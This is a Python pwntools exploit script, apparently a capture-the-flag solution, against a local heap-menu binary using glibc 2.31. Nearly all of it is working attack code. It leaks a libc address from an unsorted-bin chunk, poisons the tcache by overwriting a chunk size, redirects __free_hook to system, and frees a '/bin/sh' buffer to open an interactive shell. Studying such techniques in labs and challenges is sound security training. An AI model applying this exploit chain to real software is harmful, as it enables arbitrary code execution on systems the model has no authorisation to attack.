from pwn import *

elf = ELF("./pwn")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x410)
add_chunk(1, 0x20)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recvline()
# tmp = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00"))
# print(f"tmp = {hex(tmp)}")
libc.address = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x1ECBE0
print(f"libc.address = {hex(libc.address)}")


add_chunk(2, 0x18)  # size=0x20
add_chunk(3, 0x18)  # size=0x20
add_chunk(4, 0x28)  # size=0x30

# tcache[0x20] => chunk[2]
delete_chunk(2)

# tcache[0x30] => chunk[4]
delete_chunk(4)

# change chunk[4]->size = 0x20
edit_chunk(3, b"a" * 0x18 + p64(0x20))
# tcache[0x20] => chunk[4] => chunk[2]
delete_chunk(4)

add_chunk(4, 0x28)
# tcache[0x20] => chunk[4] => chunk(&__free_hook)
edit_chunk(4, p64(libc.sym["__free_hook"]))

# __free_hook = &system
add_chunk(2, 0x18)
add_chunk(2, 0x18)
edit_chunk(2, p64(libc.sym["system"]))

# get shell
edit_chunk(1, b"/bin/sh\x00")
delete_chunk(1)

p.interactive()
